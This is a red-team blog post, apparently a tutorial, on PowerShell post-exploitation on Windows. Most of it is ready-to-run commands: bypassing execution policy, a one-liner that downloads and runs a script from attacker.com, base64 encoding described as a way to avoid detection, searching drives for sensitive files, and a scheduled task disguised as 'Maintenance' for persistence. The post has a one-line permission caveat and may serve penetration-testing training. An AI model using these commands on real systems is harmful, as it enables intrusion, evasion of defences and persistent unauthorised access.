---
title: "PowerShell Basics for Post-Exploitation"
date: "2024-01-25"
slug: "powershell-basics"
category: "PowerShell"
tags: ["PowerShell", "Windows", "Post-Exploitation", "Red Team"]
summary: "Essential PowerShell commands and techniques for Windows post-exploitation and lateral movement."
---

# PowerShell Basics for Post-Exploitation

PowerShell is an essential tool for Windows post-exploitation. This post covers fundamental commands and techniques.

## Execution Policy Bypass

PowerShell's execution policy can often be bypassed:

```powershell
powershell.exe -ExecutionPolicy Bypass -File script.ps1
```

Or from within PowerShell:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

## Download and Execute

Download and execute scripts directly from remote sources:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")
```

## Base64 Encoding

Encode commands to avoid detection:

```powershell
$command = "Get-Process"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

## System Information

Gather system information:

```powershell
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory
```

## Network Enumeration

Enumerate network connections:

```powershell
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort
```

## Process Enumeration

List running processes:

```powershell
Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
```

## File Operations

Search for sensitive files:

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.pdf,*.docx -ErrorAction SilentlyContinue | Select-Object FullName
```

## Credential Extraction

Note: Only use on systems you own or have explicit permission to test.

PowerShell can be used to extract credentials from memory, though tools like Mimikatz are more specialized for this purpose.

## Persistence

Create scheduled tasks for persistence:

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\path\to\script.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
Register-ScheduledTask -TaskName "Maintenance" -Action $action -Trigger $trigger
```

## Best Practices

- Always test in isolated environments
- Use encoded commands when possible
- Log all activities for documentation
- Clean up artifacts after testing

